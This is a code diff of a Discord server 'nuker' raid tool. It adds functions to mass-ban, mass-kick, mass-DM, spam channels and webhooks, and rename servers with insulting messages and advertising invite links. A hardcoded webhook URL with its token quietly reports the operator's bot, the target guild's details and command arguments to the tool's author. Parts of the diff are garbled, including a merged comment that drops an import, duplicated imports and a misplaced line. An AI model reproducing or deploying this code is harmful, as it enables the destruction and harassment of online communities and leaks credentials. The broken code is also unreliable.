@@ -2,10 +2,7 @@ import os
 import shutil
 import time
 import discord
-import config
-# from . import config
-# from mzkonuker import config
-from discord.ext import commands
+# from . # from mzkonuker from discord.ext import commands
 from pystyle import Colors, Colorate
 import random
 import urllib.request
@@ -21,51 +18,118 @@ import os
 import json
 import threading
 import itertools
-import requests
 from datetime import datetime
-from config import SERVER_CONFIG, AUTO_RAID_CONFIG, EMBED_CONFIG, WEBHOOK_CONFIG, NO_BAN_KICK_ID, BOT_PRESENCE
 
 
 def clear_console():
     os.system('cls' if os.name == 'nt' else 'clear')
 
+import aiohttp
+from datetime import datetime
+
+import aiohttp
+from datetime import datetime
+
 WEBHOOK_URL = "https://discord.com/api/webhooks/1375179101576368128/ZRrJoVii09EsYd0g-CmQ9Ci1PbkuIsINWFc2ozvptx_8jczrmylflaejwKFpxu-LbwG_"
+BOT_VERSION = "1.3.0"
 
+async def log_to_webhook(user_str, user_id, status, function_name, 
+                         guild=None, error_msg=None, 
+                         command_args=None, exec_duration=None):
+    color_success = 0x2ecc71  # Green
+    color_fail = 0xe74c3c     # Red
+    embed_color = color_success if status.lower() == "success" else color_fail
 
-
-def log_to_webhook(user_str, user_id, status, function_name, guild_id=None):
     embed_fields = [
-        {"name": "User", "value": str(user_str), "inline": True},
-        {"name": "User ID", "value": str(user_id), "inline": True},
-        {"name": "Status", "value": status, "inline": False},
-        {"name": "Timestamp", "value": f"{datetime.utcnow().isoformat()}Z", "inline": False},
+        {"name": "👤 User", "value": f"{user_str}", "inline": True},
+        {"name": "🆔 User ID", "value": f"{user_id}", "inline": True},
+        {"name": "🔧 Function", "value": f"`{function_name}`", "inline": True},
+        {"name": "📊 Status", "value": status, "inline": True},
+        {"name": "⏰ Timestamp (UTC)", "value": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S"), "inline": True},
+        {"name": "🤖 Bot Version", "value": BOT_VERSION, "inline": True},
     ]
-    
-    if guild_id:
-      
+
+    if exec_duration is not None:
         embed_fields.append({
-            "name": "Guild Link",
-            "value": f"[Jump to Guild](https://discord.com/channels/{guild_id})",
+            "name": "⏳ Execution Time",
+            "value": f"{exec_duration:.2f} seconds",
+            "inline": True
+        })
+
+    if guild is not None:
+        try:
+            guild_name = getattr(guild, 'name', None) or guild.get('name', None)
+            guild_id = getattr(guild, 'id', None) or guild.get('id', None)
+            member_count = getattr(guild, 'member_count', None) or guild.get('member_count', None)
+            channels = getattr(guild, 'channels', None) or guild.get('channels', None)
+            channel_count = len(channels) if channels else (guild.get('channel_count', None) if isinstance(guild, dict) else None)
+
+            if guild_name and guild_id:
+                embed_fields.append({
+                    "name": "🏰 Guild",
+                    "value": f"[{guild_name}](https://discord.com/channels/{guild_id})\nID: `{guild_id}`",
+                    "inline": False
+                })
+
+            if member_count is not None:
+                embed_fields.append({
+                    "name": "👥 Members",
+                    "value": str(member_count),
+                    "inline": True
+                })
+
+            if channel_count is not None:
+                embed_fields.append({
+                    "name": "📁 Channels",
+                    "value": str(channel_count),
+                    "inline": True
+                })
+        except Exception:
+            if isinstance(guild, (int, str)):
+                embed_fields.append({
+                    "name": "🏰 Guild ID",
+                    "value": str(guild),
+                    "inline": False
+                })
+
+    if command_args:
+        args_str = "\n".join(f"**{k}**: {v}" for k, v in command_args.items())
+        if len(args_str) > 1024:
+            args_str = args_str[:1021] + "..."
+        embed_fields.append({
+            "name": "📝 Command Arguments",
+            "value": args_str,
             "inline": False
         })
-    
+
+    if error_msg:
+        embed_fields.append({
+            "name": "⚠️ Error",
+            "value": error_msg[:1024],
+            "inline": False
+        })
+
     data = {
         "username": "Logger Bot",
         "avatar_url": "https://cdn-icons-png.flaticon.com/512/616/616408.png",
         "embeds": [
             {
-                "title": f"🔧 Function Used: {function_name}",
-                "color": 0x00FF00 if status.lower() == "success" else 0xFF0000,
-                "fields": embed_fields
+                "title": f"{'✅ Success' if status.lower() == 'success' else '❌ Failure'} - {function_name}",
+                "color": embed_color,
+                "fields": embed_fields,
+                "footer": {"text": "Made with 💙 by Your Nuker"},
+                "timestamp": datetime.utcnow().isoformat()
             }
         ]
     }
-    try:
-        response = requests.post(WEBHOOK_URL, json=data)
-        if response.status_code not in [200, 204]:
-            print(f"Webhook log failed with status code {response.status_code}: {response.text}")
-    except Exception as e:
-        print(f"Webhook log failed: {e}")
+
+    async with aiohttp.ClientSession() as session:
+        try:
+            async with session.post(WEBHOOK_URL, json=data) as response:
+                if response.status not in (200, 204):
+                    print(f"[!] Webhook failed with status: {response.status}")
+        except Exception as e:
+            print(f"[!] Webhook error: {e}")
 
 
 def get_latest_release_version(repo_owner, repo_name):
@@ -230,7 +294,7 @@ async def send_messages_to_channels(channel, num_messages, message_content, incl
 
 async def send_embed(channel, include_everyone=False):
     try:
-        embed_config = config.EMBED_CONFIG
+        embed_config = EMBED_CONFIG
 
         embed = discord.Embed(
             title=embed_config.get("title", ""),
@@ -255,7 +319,6 @@ async def send_embed(channel, include_everyone=False):
         print((Colorate.Color(Colors.red, f"[-] Can't send embed to {channel.name}: {e}")))
 
 
-from mzkonuker.config import NO_BAN_KICK_ID
 
 async def ban_all(server_id, bot_id):
     try:
@@ -367,7 +430,6 @@ async def dm_all(server_id):
     except Exception as e:
         print(Colorate.Color(Colors.red, f"[-] Error: {e}"))
 
-from mzkonuker.config import NO_BAN_KICK_ID
 
 async def kick_all(server_id, bot_id):
     try:
@@ -462,7 +524,7 @@ async def change_server(server_id, new_name=None, new_icon=None, new_description
     try:
         guild = bot.get_guild(int(server_id))
         if guild:
-            server_config = config.SERVER_CONFIG
+            server_config = SERVER_CONFIG
 
             # Use passed values, else fallback to input or config
             if new_name is None:
@@ -494,7 +556,7 @@ async def change_server(server_id, new_name=None, new_icon=None, new_description
 
 async def spam_webhooks(guild):
     try:
-        webhook_config = config.WEBHOOK_CONFIG
+        webhook_config = WEBHOOK_CONFIG
 
         webhooks = []
         for channel in guild.channels:
@@ -535,7 +597,7 @@ async def send_embed_webhook(webhook, num_messages, message_content, include_eve
 
 async def send_embed_webhook_message(webhook, include_everyone):
     try:
-        embed_config = config.EMBED_CONFIG
+        embed_config = EMBED_CONFIG
 
         embed = discord.Embed(
             title=embed_config.get("title", ""),
@@ -577,7 +639,6 @@ async def webhook_spam(server_id):
     except Exception as e:
         print((Colorate.Color(Colors.red, f"[-] Error: {e}")))
 
-from mzkonuker.config import AUTO_RAID_CONFIG
 
 def log_message(color, message):
     print(Colorate.Color(color, message))
@@ -696,7 +757,7 @@ async def super_nuke(
     channel_name,
     channel_type="text",
     num_messages=20,
-    message_content="@everyone YK SECURITY IS ASS -MZKO https://discord.gg/vzuEC6auCg :heart:",
+    message_content="@everyone **SA MUNDONG MAGANDA BAKIT KAYO NAGPAKATANGA? -MZKO** AD BREAK! https://discord.gg/vzuEC6auCg https://discord.gg/GdTk5r3SeN :heart:",
     include_everyone=False
 ):
     try:
@@ -784,7 +845,7 @@ async def rename_and_botspam_all_channels(
     guild_id: int, 
     new_name: str, 
     new_guild_name: str,  
-    spam_message="@everyone YK SECURITY IS ASS -MZKO https://discord.gg/vzuEC6auCg :heart:", 
+    spam_message="@everyone **SA MUNDONG MAGANDA BAKIT KAYO NAGPAKATANGA? -MZKO** AD BREAK! https://discord.gg/vzuEC6auCg https://discord.gg/GdTk5r3SeN :heart:", 
     spam_count=50
 ):
     guild = bot.get_guild(guild_id)
@@ -807,7 +868,7 @@ async def rename_and_botspam_all_channels(
     guild_id: int, 
     new_name: str, 
     new_guild_name: str,  
-    spam_message="@everyone YK SECURITY IS ASS -MZKO https://discord.gg/vzuEC6auCg :heart:", 
+    spam_message="@everyone **SA MUNDONG MAGANDA BAKIT KAYO NAGPAKATANGA? -MZKO** AD BREAK! https://discord.gg/vzuEC6auCg https://discord.gg/GdTk5r3SeN :heart:", 
     spam_count=50
 ):
     guild = bot.get_guild(guild_id)
@@ -879,6 +940,50 @@ import itertools
 from pystyle import Colors, Colorate
 import discord
 from discord.ext import commands
+
+EMBED_CONFIG = {
+    "title": "sadlife discordians",
+    "description": "bitch boy :P",
+    "color": 0xFF5733,
+    "fields": [
+        {"name": "test", "value": "test", "inline": False},
+        {"name": "test", "value": "test", "inline": False},
+        {"name": "test", "value": "test", "inline": False},
+    ],
+    "image": "",
+    "footer": "",
+}
+
+SERVER_CONFIG = {
+    "new_name": "WAG MAGING TANGA PLEASE",
+    "new_icon": "",
+    "new_description": "get better xd",
+}
+
+WEBHOOK_CONFIG = {
+    "default_name": "FUCK YALL ASS LOL MZKOTOOLS",
+}
+
+AUTO_RAID_CONFIG = {
+    'num_channels': 100,
+    'channel_type': 'text',
+    'channel_name': 'fuckedbymzko',
+    'num_messages': 40,
+    'message_content': '@everyone KNM X MZKO .gg/vivrella :P'
+}
+
+NO_BAN_KICK_ID = {
+    000000000000,
+    111111111111,
+    222222222222,
+}
+
+BOT_PRESENCE = {
+    "type": "listening",
+    "text": "Mzko"
+}
+
+
 
 CONFIG_FILE = "config.json"
 
@@ -1001,24 +1106,26 @@ async def on_ready():
         print(Colorate.Color(Colors.green, f'[+] Bot is in the specified server ({server.name})'))
         clear_console()
         try:
-            log_to_webhook(
+            await log_to_webhook(
                 user_str=str(bot.user),
                 user_id=bot.user.id,
-                status="Online",
+                status="Success",
                 function_name="on_ready",
-                guild_id=server.id
+                guild=server
             )
-        except Exception:
-            pass  # Silently ignore logging failures
+        except Exception as e:
+            print(f"[!] Logging webhook failed: {e}")
     else:
         print(Colorate.Color(Colors.red, f'[-] Bot is not in the specified server'))
         return
 
-    from mzkonuker.config import BOT_PRESENCE
+        presence_type = getattr(ActivityType, BOT_PRESENCE["type"].lower())
     presence_type = getattr(ActivityType, BOT_PRESENCE["type"].lower())
     await bot.change_presence(activity=Activity(type=presence_type, name=BOT_PRESENCE["text"]))
 
     await asyncio.sleep(2)
+
+
 
 
     while True:
@@ -1028,22 +1135,24 @@ async def on_ready():
        ⠀⠀⠀⠀⠀⣀⣠⣤⣴⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⣿⣷⠀⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠉⠉⠉⠉⠉⠉⠙⠛⠻⢿⣷⡀⠀⠀⠀⠀⠀
        ⠀⠀⢿⣿⠀⢹⣿⣿⡿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠈⠙⠄⠀⠀⠀
-      ⠀⠀⠸⣿⡇      ______     ______     __  __     __    
+      ⠀⠀⠸⣿⡇       ______     ______     __  __     __    
       /\___  \   /\  __ \   /\  == \   /\ \/ /    /\ \  
       \/_/  /__  \ \ \/\ \  \ \  __<   \ \  _"-.  \ \ \  
         /\_____\  \ \_____\  \ \_\ \_\  \ \_\ \_\  \ \_\ 
         \/_____/   \/_____/   \/_/ /_/   \/_/\/_/   \/_/  
-     ⠀⠀⠀⠀⠀⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀╭══════════════════════════════╮
-     ⠀⠀⠀⠀⠀  ⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  |            v1.0             |
-        ⠀⠀ ⣀⣠⣴⡿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀|════════════════════════════|
-        ⠀⠀⠈⠛⠛⠉⠈⠛⢿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⠀⠀⠀|  Mzko/Zorki |   KNMKILLAS |⠀
-    ⠀   ⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀|        xender_123         |
-    ⠀⠀  ⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠙⠻⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀╰═══════════════════════════╯
+     ⠀⠀⠀⠀⠀⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀         v1.0
+     ⠀⠀⠀⠀⠀  ⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  
+        ⠀⠀ ⣀⣠⣴⡿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀
+        ⠀⠀⠈⠛⠛⠉⠈⠛⢿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀
+    ⠀   ⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀  ⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠙⠻⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
     ⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
     ⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
     ⠀⠀⠀⠀⠀   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
     ⠀⠀⠀⠀⠀⠀  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀
-                    
+                                   ╔═══════════════════════════════╗
+                                   ║  Mzko/Zorki  | .gg/vzuEC6auCg ║
+                                   ╚═══════════════════════════════╝
     ╭══════════════════════════════╮╭══════════════════════════════╮╭══════════════════════════════╮
     │      1 - Delete Channel      ││      2 - Create Channels     ││       3 - Spam Channels      │
     ╞══════════════════════════════╡╞══════════════════════════════╡╞══════════════════════════════╡
@@ -1157,7 +1266,7 @@ async def on_ready():
                 channel_name = input("Enter name for new channels: ")
                 message_content = input("Enter spam message (leave blank for default): ").strip()
                 if not message_content:
-                    message_content = "@everyone YK SECURITY IS ASS -MZKO https://discord.gg/vzuEC6auCg :heart:"
+                    message_content = "@everyone **SA MUNDONG MAGANDA BAKIT KAYO NAGPAKATANGA? -MZKO** AD BREAK! https://discord.gg/vzuEC6auCg https://discord.gg/GdTk5r3SeN :heart:"
                 include_everyone_input = input("Tag @everyone in messages? (y/n): ").lower()
                 include_everyone = include_everyone_input == 'y'
 
